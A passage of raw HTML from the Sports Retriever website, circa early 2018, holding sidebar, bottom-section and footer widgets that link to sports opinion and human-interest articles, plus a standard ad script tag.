				<div class="hot_stories_small_item_content">
					<h2 class="hot_stories_small_item_header">PSG can’t buy the Champions League</h2>
					<p class="hot_stories_small_item_meta">Mar 11, 2018</p>
				</div>
			</a>
												<a href="http://sportsretriever.com/soccer/v-r-will-make-world-cup-debut-summer-time/" class="hot_stories_small_item">
				<div class="hot_stories_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/06163941/VAR-tech-2-168x120.jpg')"></div>
				<div class="hot_stories_small_item_content">
					<h2 class="hot_stories_small_item_header">V.A.R. will make its World Cup debut this summer, and it’s about time</h2>
					<p class="hot_stories_small_item_meta">Mar 10, 2018</p>
				</div>
			</a>
												<a href="http://sportsretriever.com/football/rob-gronkowski-pursue-career-wwe/" class="hot_stories_small_item">
				<div class="hot_stories_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/06112327/rob-gronkowski-2-168x120.jpg')"></div>
				<div class="hot_stories_small_item_content">
					<h2 class="hot_stories_small_item_header">Rob Gronkowski should pursue a career in the WWE</h2>
					<p class="hot_stories_small_item_meta">Mar 9, 2018</p>
				</div>
			</a>
			</div>
</div>
		</div>
	</div>

</div>
		</div>
		<div
			class="col-xs-12 col-sm-4 col-md-4 hidden-xs hidden-sm aside_right">
			<div class="widget">
				<div class="place_ads_mob_first" style="text-align: center;">
  <!-- BEGIN JS TAG - SR D RR-ATF US < - DO NOT MODIFY -->
  <SCRIPT SRC="http://ads.pubsqrd.com/ttj?id=11561452&size=300x250" TYPE="text/javascript"></SCRIPT>
  <!-- END TAG -->
</div>
			</div>
			
<div class="widget">
	<div class="top_headlines">
		<h2 class="home_header widget-title">Top Headlines</h2>
		<ul>
								<li><a href="http://sportsretriever.com/football/six-free-agents-nfl-teams-beware-signing/">Six NFL free agents teams should be wary of signing</a></li>
										<li><a href="http://sportsretriever.com/basketball/everything-need-know-big-12-tournament-tips-off/">Everything you need to know before the Big 12 Tournament tips off</a></li>
										<li><a href="http://sportsretriever.com/basketball/quick-preview-acc-preview/">A quick preview of the ACC Tournament</a></li>
										<li><a href="http://sportsretriever.com/stories/looking-back-week-sports-history-march-4-10/">Looking back: this week in sports history March 4 &#8211; 10</a></li>
										<li><a href="http://sportsretriever.com/basketball/nba-need-hard-salary-cap/">Does the NBA need a hard salary cap?</a></li>
										<li><a href="http://sportsretriever.com/baseball/elite-closer-become-obsolete-mlb/">Has the &#8220;elite closer&#8221; become obsolete in MLB?</a></li>
										<li><a href="http://sportsretriever.com/soccer/2018-world-cup-group-c-analysis/">2018 World Cup: Group C Analysis</a></li>
							</ul>
	</div>
</div>

			
<div class="widget">
	<div class="aside_small_wrap">
						<a href="http://sportsretriever.com/football/how-far-are-the-san-francisco-49ers-from-being-a-true-contender/" class="aside_small_item">
					<div class="aside_small_item_img"
					     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/18082822/Trent-Taylor-168x120.jpg')"></div>
					<div class="aside_small_item_content">
						<p class="aside_small_item_meta"><span
								class="aside_small_item_meta_author">Travis Pulver</span>
							<span class="aside_small_item_meta_category">Football</span>
						</p>
						<h2 class="aside_small_item_header">How far are the San Francisco 49ers from being a true contender?</h2>
					</div>
				</a>
								<a href="http://sportsretriever.com/basketball/5-teams-heading-march-red-hot/" class="aside_small_item">
					<div class="aside_small_item_img"
					     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/28094238/Giddy-Potts-vs-miami-168x120.jpg')"></div>
					<div class="aside_small_item_content">
						<p class="aside_small_item_meta"><span
								class="aside_small_item_meta_author">David Schwartz</span>
							<span class="aside_small_item_meta_category">Basketball</span>
						</p>
						<h2 class="aside_small_item_header">5 Teams heading into March red hot</h2>
					</div>
				</a>
								<a href="http://sportsretriever.com/basketball/has-trae-young-played-himself-out-of-top-ten-draft/" class="aside_small_item">
					<div class="aside_small_item_img"
					     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/25124108/trey-young-6-168x120.jpg')"></div>
					<div class="aside_small_item_content">
						<p class="aside_small_item_meta"><span
								class="aside_small_item_meta_author">Travis Pulver</span>
							<span class="aside_small_item_meta_category">Basketball</span>
						</p>
						<h2 class="aside_small_item_header">Has Trae Young played himself out of the top ten of the draft?</h2>
					</div>
				</a>
								<a href="http://sportsretriever.com/stories/looking-back-week-sports-history-february-25-march-3/" class="aside_small_item">
					<div class="aside_small_item_img"
					     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/26085443/jordan-58-point-game-168x120.jpg')"></div>
					<div class="aside_small_item_content">
						<p class="aside_small_item_meta"><span
								class="aside_small_item_meta_author">Lela Ordinaev</span>
							<span class="aside_small_item_meta_category">Stories</span>
						</p>
						<h2 class="aside_small_item_header">Looking back: This week in sports history February 25 &#8211; March 3</h2>
					</div>
				</a>
					</div>
</div>
			
<div class="widget">
	<div class="aside_big_one">
						<a href="http://sportsretriever.com/baseball/chicago-cubs-bigger-world-series-contenders-signing-yu-darvish/" class="aside_big_one_item">
					<div class="aside_big_one_item_img"
					     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/26094125/darvish-cubs-390x240.jpg')"></div>
					<div class="aside_big_one_item_content">
						<p class="aside_big_one_item_content_category">Baseball</p>
						<h2 class="aside_big_one_item_content_header">Chicago Cubs bigger World Series contenders after signing Yu Darvish?</h2>
						<p class="aside_big_one_item_content_meta">By Travis Pulver</p>
						<p class="aside_big_one_item_content_text">





The offseason was a strange one for Major League Baseball. Spring training for the 2018 season is underway, but, surprisingly, as...</p>
					</div>
				</a>
					</div>
</div>
		</div>
	</div>
</div>
	
<div class="bottom_four hidden-sm hidden-xs">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<div class="bottom_four_wrap">
					<div class="row">
														<div class="col-sm-12 col-md-3">
									<a href="http://sportsretriever.com/basketball/guys-want-help-basketball-players-perfect-shot/" class="bottom_four_item">
										<div class="bottom_four_item_img"
										     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2017/12/24115532/basketball-2109872_1280-390x240.jpg')"></div>
										<div class="bottom_four_item_content">
											<p class="bottom_four_item_content_category">Basketball</p>
											<h2 class="bottom_four_item_content_header">These guys want to help basketball players perfect their shot</h2>
											<p class="bottom_four_item_content_meta">By Merav Savir</p>
											<p class="bottom_four_item_content_text">







There are no identical shots in basketball. Once the ball leaves a shooter’s hands, it is difficult to replicate exactly where it will land, its arc and its rotation. 

Just imagine it on a diagram similar to that of a...</p>
										</div>
									</a>
								</div>
																<div class="col-sm-12 col-md-3">
									<a href="http://sportsretriever.com/stories/50-years-still-rucking-strong-rugby-team-survives-half-century-heart-football-country-well-known-established-fact-great-state-texas-football-count/" class="bottom_four_item">
										<div class="bottom_four_item_img"
										     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2017/09/05060330/Mardi-Gras-1999-390x240.jpg')"></div>
										<div class="bottom_four_item_content">
											<p class="bottom_four_item_content_category">Stories</p>
											<h2 class="bottom_four_item_content_header">50 Years and rucking strong: How a rugby team survives in football country</h2>
											<p class="bottom_four_item_content_meta">By Travis Pulver</p>
											<p class="bottom_four_item_content_text">







It is a well-known and established fact that the great state of Texas is football country. Yes, there are other states where football is very popular, but nowhere does it come as close to a religion as it does in Texas.

That’s why...</p>
										</div>
									</a>
								</div>
																<div class="col-sm-12 col-md-3">
									<a href="http://sportsretriever.com/stories/lucid-app-introducing-mental-strength-training-athletes-ages/" class="bottom_four_item">
										<div class="bottom_four_item_img"
										     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2017/10/26083623/stirman-390x240.png')"></div>
										<div class="bottom_four_item_content">
											<p class="bottom_four_item_content_category">Stories</p>
											<h2 class="bottom_four_item_content_header">Lucid: the app introducing mental strength training to athletes of all ages</h2>
											<p class="bottom_four_item_content_meta">By Merav Savir</p>
											<p class="bottom_four_item_content_text">







Hall of Fame leftfielder Ted Williams once said that “hitting is 50 percent over the shoulder.”

It takes a lot more than just a swing of the bat to become a two-time MVP, two-time triple crown champion, six-time batting champion...</p>
										</div>
									</a>
								</div>
																<div class="col-sm-12 col-md-3">
									<a href="http://sportsretriever.com/stories/sharing-shoes-sticks-socks-lacrosse-developed-kenyan-slums/" class="bottom_four_item">
										<div class="bottom_four_item_img"
										     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2017/07/16131510/lacrosse-kenya-new-390x240.png')"></div>
										<div class="bottom_four_item_content">
											<p class="bottom_four_item_content_category">Stories</p>
											<h2 class="bottom_four_item_content_header">Sharing shoes, sticks and socks: how lacrosse is being developed in the Kenyan slums</h2>
											<p class="bottom_four_item_content_meta">By Merav Savir</p>
											<p class="bottom_four_item_content_text">







The “field” is patchy. There are areas where grass grows, but the players have also learned to run through the dirt. During the wet season they run through the mud, some of them without shoes. Right beyond the tree line, the smell of...</p>
										</div>
									</a>
								</div>
													</div>
				</div>
			</div>
		</div>
	</div>
</div>
		
<div class="bottom_section hidden-sm hidden-xs">
	<div class="container">
		<div class="row">
																		<div class="col-md-4">
						<a href="http://sportsretriever.com/stories/five-moments-well-never-forget-pyeongchang-2018/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/25103802/Red-Gerard-168x120.png')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Five moments we&#8217;ll never forget from PyeongChang 2018</h2>
								<p class="bottom_section_small_item_meta">Feb 25, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/stories/winter-olympians-see-tokyo-2020/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/21093233/Pita-Taufatofua-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Winter Olympians we could see in Tokyo 2020</h2>
								<p class="bottom_section_small_item_meta">Feb 25, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/basketball/uva-different-season/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/21091324/ty-jerome-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Is UVA different this season?</h2>
								<p class="bottom_section_small_item_meta">Feb 24, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/stories/wwe-way-ronda-rousey-get-back-ufc/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/18075049/ronda-rousey-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Is the WWE a way for Ronda Rousey to get back into UFC?</h2>
								<p class="bottom_section_small_item_meta">Feb 23, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/football/seven-nfl-combine-snubs-that-will-probably-get-drafted/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/18100813/joe-ostman-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Seven NFL Combine snubs that will likely get drafted</h2>
								<p class="bottom_section_small_item_meta">Feb 22, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/stories/closing-gap-men-womens-surfing/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/18103641/Stephanie-Gilmore-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Closing the gap between men and women’s surfing</h2>
								<p class="bottom_section_small_item_meta">Feb 21, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/hockey/golden-knights-changing-expect-expansion-teams/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/19094041/golden-knights-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Are the Golden Knights changing what we expect of expansion teams?</h2>
								<p class="bottom_section_small_item_meta">Feb 20, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/stories/looking-back-week-sports-history-february-18-24/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/18160323/miracle-on-ice-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Looking back: this week in sports history February 18 &#8211; 24</h2>
								<p class="bottom_section_small_item_meta">Feb 19, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/football/seven-free-agents-pay-raise-super-bowl/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/11124400/LeGarrette-Blount-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Seven free agents that are going to cash in after playing in the Super Bowl</h2>
								<p class="bottom_section_small_item_meta">Feb 18, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/soccer/learned-first-matches-champions-league-round-16/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/17112712/ronaldo-neymar-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">What we learned from the first matches of the Champions League Round of 16</h2>
								<p class="bottom_section_small_item_meta">Feb 17, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/football/philadelphia-eagles-fans-are-going-to-love-nick-foles-even-more-once-he-is-traded/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/13072604/nick-foles-td-celebration-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">The Philadelphia Eagles aren&#8217;t done with Nick Foles just yet</h2>
								<p class="bottom_section_small_item_meta">Feb 16, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/basketball/lebron-new-young-family/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/14093103/lebron-james-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">LeBron has a new (young) family</h2>
								<p class="bottom_section_small_item_meta">Feb 15, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/stories/shaun-white-won-usas-100th-gold-moment-perfect/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/14111057/shaun-white-3-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Shaun White won the USA’s 100th gold, and the set up was perfect</h2>
								<p class="bottom_section_small_item_meta">Feb 14, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/basketball/jabari-parkers-return-impact-milwaukee-bucks/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/13075735/jabarip-parker-2-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">How much of an impact will Jabari Parker&#8217;s return have on the Milwaukee Bucks?</h2>
								<p class="bottom_section_small_item_meta">Feb 13, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/stories/looking-back-week-sports-history-february-11-17/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/11090959/clyde-drexler-1995-rockets-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Looking back: This week in sports history February 11-17</h2>
								<p class="bottom_section_small_item_meta">Feb 12, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/basketball/san-antonio-spurs-legacy-in-danger-of-ending/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/04105251/lamarcus-aldridge-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Is the San Antonio Spurs legacy in danger of ending this season?</h2>
								<p class="bottom_section_small_item_meta">Feb 11, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/football/nfl-escapes-pr-disaster-by-extending-combine-invite-to-ucf-linebacker-shaquem-griffin/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/04102334/shaquem-griffin-4-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">NFL did the right thing by extending combine invite to Shaquem Griffin</h2>
								<p class="bottom_section_small_item_meta">Feb 10, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/basketball/whats-different-ok3/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/07094149/russell-westbrook-2-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">What&#8217;s different about the OK3?</h2>
								<p class="bottom_section_small_item_meta">Feb 9, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/stories/women-making-history-2018-olympics/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/06090936/nigeria-skeleton-simisleighs-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">These women are making history at the 2018 Olympics</h2>
								<p class="bottom_section_small_item_meta">Feb 8, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/hockey/nhl-teams-buying-selling-trade-deadline/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/04111904/Derick-Brassard-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Which teams are buying &#038; selling as the NHL trade deadline approaches?</h2>
								<p class="bottom_section_small_item_meta">Feb 7, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/basketball/whos-favorite-eastern-conference/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/04153714/boston-celtics-168x120.jpeg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Who&#8217;s the favorite in the Eastern Conference?</h2>
								<p class="bottom_section_small_item_meta">Feb 6, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/stories/looking-back-week-sports-history-february-4-10/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/05092245/Super-Bowl-XXXIX-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Looking back: This week in sports history February 4-10</h2>
								<p class="bottom_section_small_item_meta">Feb 5, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/soccer/saudi-arabias-new-way-train-soccer-players-raising-eyebrows/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/02/04095258/Fahad-al-Muwallad-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Saudi Arabia&#8217;s new way to train its soccer players is raising some eyebrows</h2>
								<p class="bottom_section_small_item_meta">Feb 4, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/football/nfc-east-toughest-division-in-nfl-next-season/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/01/30092301/dallas-cowboys-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Is the NFC East going to be the toughest division in the NFL next season?</h2>
								<p class="bottom_section_small_item_meta">Feb 3, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/stories/whats-new-2018-olympics/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/01/25112854/big-air-snowboarding-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">What’s new at the 2018 Olympics?</h2>
								<p class="bottom_section_small_item_meta">Feb 2, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/baseball/mlb-players-every-fan-will-know-2018/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2017/08/17064840/rafael-devers-2-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">MLB players every fan will know by the end of the 2018 season</h2>
								<p class="bottom_section_small_item_meta">Feb 1, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/tennis/wozniackis-1st-federers-20th-equally-thrilling-tennis-world/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/01/31072815/australian-open-court-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Wozniacki’s 1st &#038; Federer’s 20th equally thrilling for tennis world</h2>
								<p class="bottom_section_small_item_meta">Jan 31, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/basketball/seven-games-impact-2017-18-ncaab-season-stretch/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/01/30100722/Keita-Bates-Diop-ohio-state-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Seven games that could impact the college basketball season down the stretch</h2>
								<p class="bottom_section_small_item_meta">Jan 30, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/stories/looking-back-week-sports-history-january-28-february-3/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/01/22093805/lydia-ko-2-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Looking back: this week in sports history January 28 &#8211; February 3</h2>
								<p class="bottom_section_small_item_meta">Jan 29, 2018</p>
							</div>
						</a>
					</div>
																				<div class="col-md-4">
						<a href="http://sportsretriever.com/football/nfl-fans-can-badbut-can-also-freaking-awesome/" class="bottom_section_small_item">
							<div class="bottom_section_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/01/24115139/screen-shot-andy-dalton-foundation-168x120.jpg')"></div>
							<div class="bottom_section_small_item_content">
								<h2 class="bottom_section_small_item_header">Five times NFL fans were absolutely awesome</h2>
								<p class="bottom_section_small_item_meta">Jan 28, 2018</p>
							</div>
						</a>
					</div>
					

		</div>
	</div>
</div>

	</main>



<footer id="main_footer">
		<div class="container">
		<div class="footer_about">
	<div class="row">
		<div class="col-xs-12">

			<a href="http://sportsretriever.com" class="footer_logo">
									<img
						src="http://sportsretriever.com/wp-content/themes/sportsretriver/images/logo_footer.png"
						alt="Sports Retriever"
						class="img-responsive footer_logo_img">
							</a>
			<div class="footer_about_content">
				<h2 class="widget-title_footer">ABOUT US</h2>
				<p class="footer_about_text">Sports Retriever is the leading destination for human interest and opinion sports stories. Our goal is to give readers a new and different perspective on the latest headlines as well as report on small town stories that could have a global impact. Have a story you think we should cover? Send us a message and let us know.</p>
			</div>

			<div class="footer_about_divider hidden-lg hidden-md"></div>
			<div class="footer_social">
				<a href="https://twitter.com/SportsRetriever/" class="icon icon-footer_social_tw" target="_blank"></a>
				<a href="https://facebook.com/sportsretriever/"
				   class="icon icon-footer_social_fb" target="_blank"></a>
			</div>
		</div>
	</div>
</div>

		
<div class="footer_popular">
	<div class="row">
		<div class="col-xs-12">
			<div class="widget">
				<h2 class="widget-title_footer">POPULAR POSTS</h2>
				<div class="footer_widgets_items_wrap">
																										<a href="http://sportsretriever.com/basketball/four-nba-teams-good-shot-ending-playoff-drought-season/"
							   class="footer_widgets_item">
								<div class="footer_widgets_item_img"
								     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/01/21104445/emiid-and-simmons-168x120.jpg')"></div>
								<div class="footer_widgets_item_content">
									<h2 class="footer_widgets_item_header">Four NBA teams that have a good shot at ending their playoff drought this season</h2>
									<p class="footer_widgets_item_meta">Jan 26, 2018</p>
								</div>
							</a>
																												<a href="http://sportsretriever.com/basketball/nba-rookie-year-race/"
							   class="footer_widgets_item">
								<div class="footer_widgets_item_img"
								     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/01/16095220/donovan-mitchel-168x120.jpg')"></div>
								<div class="footer_widgets_item_content">
									<h2 class="footer_widgets_item_header">The NBA has a Rookie of the Year race</h2>
									<p class="footer_widgets_item_meta">Jan 25, 2018</p>
								</div>
							</a>
																												<a href="http://sportsretriever.com/football/new-nfl-head-coaches-in-best-position-to-succeed-2018/"
							   class="footer_widgets_item">
								<div class="footer_widgets_item_img"
								     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/01/21102300/jon-gruden-168x120.jpg')"></div>
								<div class="footer_widgets_item_content">
									<h2 class="footer_widgets_item_header">Which new NFL head coaches are in the best position to succeed in 2018?</h2>
									<p class="footer_widgets_item_meta">Jan 24, 2018</p>
								</div>
							</a>
											</div>
			</div>

		</div>
	</div>
</div>
		
<div class="footer_trending hidden-xs hidden-sm">
	<div class="row">
		<div class="col-xs-12">
			<div class="widget">
				<h2 class="widget-title_footer">Trending now</h2>
				<div class="footer_widgets_items_wrap">
																										<a href="http://sportsretriever.com/stories/looking-back-week-sports-history-january-21-27/"
							   class="footer_widgets_item">
								<div class="footer_widgets_item_img"
								     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/01/21133356/klay-thomspon-37-points-in-a-quater-168x120.jpg')"></div>
								<div class="footer_widgets_item_content">
									<h2 class="footer_widgets_item_header">Looking back: this week in sports history January 21-27</h2>
									<p class="footer_widgets_item_meta">Jan 23, 2018</p>
								</div>
							</a>
																												<a href="http://sportsretriever.com/basketball/demarcus-cousinss-triple-double-compare-others-nba-history/"
							   class="footer_widgets_item">
								<div class="footer_widgets_item_img"
								     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/01/23101804/demarcus-cousins-pelicans-168x120.jpg')"></div>
								<div class="footer_widgets_item_content">
									<h2 class="footer_widgets_item_header">How does DeMarcus Cousins’s triple-double compare to others in NBA history?</h2>
									<p class="footer_widgets_item_meta">Jan 23, 2018</p>
								</div>
							</a>
																												<a href="http://sportsretriever.com/basketball/picking-star-starters/"
							   class="footer_widgets_item">
								<div class="footer_widgets_item_img"
								     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/01/22075749/lebron-and-curry-168x120.jpg')"></div>
								<div class="footer_widgets_item_content">
									<h2 class="footer_widgets_item_header">Picking the All-Star starters</h2>
									<p class="footer_widgets_item_meta">Jan 22, 2018</p>
								</div>
							</a>
											</div>
			</div>

		</div>
	</div>
</div>

	</div>
		<div id="footer_menu">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<ul id="menu-footer" class="footer_menu"><li id="menu-item-1162" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1162"><a title="Contact Us" href="http://sportsretriever.com/contact-us/">Contact Us</a></li>
